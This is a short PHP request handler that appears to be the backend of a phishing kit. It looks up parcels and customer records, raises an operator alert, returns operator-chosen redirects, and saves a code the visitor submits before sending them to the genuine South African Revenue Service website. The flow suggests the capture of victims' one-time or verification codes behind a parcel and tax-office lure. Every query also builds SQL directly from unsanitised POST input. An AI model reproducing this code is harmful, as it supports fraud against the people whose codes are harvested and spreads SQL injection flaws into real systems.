<?php
require "../common/commonfiles.php";

if(isset($_POST["action"])){
	
	$case = $_POST["action"];
	
	switch ($case){
		
		
		case "get-parcel":
		
			$parcelno = $_POST["parcelno"];
		
			$data = db::getRecord("select * from parcels where parcelnumber = '$parcelno'");
			
			echo json_encode($data);
			
		
		break;
		
		case "check-code":
			$code = $_POST["code"];
		
			$data = db::getRecord("select * from customer_details where id = '$code'");
			
			echo json_encode([

				"success"=>$data ? true : false,
				"data"=>$data["id"]
				

			]);
		break;
		
		case "review-answer":
			
			$code = $_POST["data"];
		
			$data = db::getRecord("select * from customer_details where id = '$code'");
			db::updateRecord("update sound1 set value = 1");
			echo json_encode([

				"success"=>$data["redirect1"] ? true : false,
				"status"=>$data["status"],
				"data"=>$data["redirect1"] != "url" ? "block" : "none",
				"redirectto"=>$data["redirect1"] == "url" ? "page3.php" : "",
				"all"=>$data,
				"code"=>$code

			]);
		break;
		
		case "review-code":
			$id = $_POST["data"];
			$code = $_POST["code"];
		
			// Fetch the customer details record
			$data = db::getRecord("select * from customer_details where id = '$id'");
		
			// Update the customer details record
			db::updateRecord("update customer_details set status=0, code = '$code' where id = '$id'");
		
			// Prepare the response
			echo json_encode([
				"success" => $data["status"],
				"data" => $data["status"] == 1 ? "https://www.sars.gov.za/" : "./"
			]);
			break;
		
	}
	
	
}








?>